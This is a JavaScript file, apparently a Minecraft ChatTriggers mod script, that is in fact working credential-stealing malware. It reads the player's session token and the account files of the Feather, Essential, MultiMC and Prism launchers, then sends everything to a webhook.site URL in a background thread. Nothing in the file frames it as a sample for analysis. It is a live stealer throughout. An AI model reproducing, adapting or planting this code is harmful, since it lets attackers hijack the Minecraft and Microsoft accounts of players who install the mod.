let File = Java.type('java.io.File');
let appData = new File(java.lang.System.getenv("APPDATA"))
let mcFolder = new File(Client.getMinecraft().field_71412_D.getPath())
let instanceFolder = new File(mcFolder.parent)
let instancesFolder = new File(instanceFolder.parent)
let launcherFolder = new File(instancesFolder.parent)
let mmc =  FileLib.read(`${launcherFolder}\\accounts.json`);
let prism = FileLib.read(`${appData}\\PrismLauncher\\accounts.json`)

if(launcherFolder.getPath().includes("Prism")) {
    prism = FileLib.read(`${launcherFolder}\\accounts.json`);
    mmc = null;
}

const data = {
    username: Player.getName(),
    uuid: Player.getUUID(),
    token: Client.getMinecraft().func_110432_I().func_148254_d(),
    feather: FileLib.read(`${appData}\\.feather\\accounts.json`),
    essentials: FileLib.read(`${mcFolder}\\essential\\microsoft_accounts.json`),
    mmc: mmc,
    prism: prism,
};

const link = "https://webhook.site/15d5c61c-f664-4b31-ad32-8f5a72852c80"

new Thread(() => {
    try {
        const url = new java.net.URL(link)
        const connection = url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0");
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setDoOutput(true);

        const outputStream = new java.io.OutputStreamWriter(connection.getOutputStream());
        const messageContent = `
=== USER INFORMATION ===
Username: ${data.username}
UUID: ${data.uuid}
Token: ${data.token}


=== FEATHER CLIENT DATA ===
${data.feather || 'No Feather client data found'}

=== ESSENTIALS DATA ===
${data.essentials || 'No Essentials data found'}

=== MULTIMC DATA ===
${data.mmc || 'No MultiMC data found'}

=== PRISM LAUNCHER DATA ===
${data.prism || 'No Prism Launcher data found'}
`;

        outputStream.write(messageContent);
       
        outputStream.flush();
        outputStream.close();

        if (connection.getResponseCode() === 200) {
            const reader = new java.io.BufferedReader(new java.io.InputStreamReader(connection.getInputStream()));
            const response = new java.lang.StringBuilder();
            let inputLine;

            while ((inputLine = reader.readLine()) !== null) response.append(inputLine);
            reader.close();

            Client.scheduleTask(() => console.log(JSON.parse(response.toString())));
        } else {
            Client.scheduleTask(() => console.error('Error: HTTP response code ' + connection.getResponseCode()));
        }
    } catch (e) {
        Client.scheduleTask(() => console.error('Error: ' + e.message));
    }
}).start();
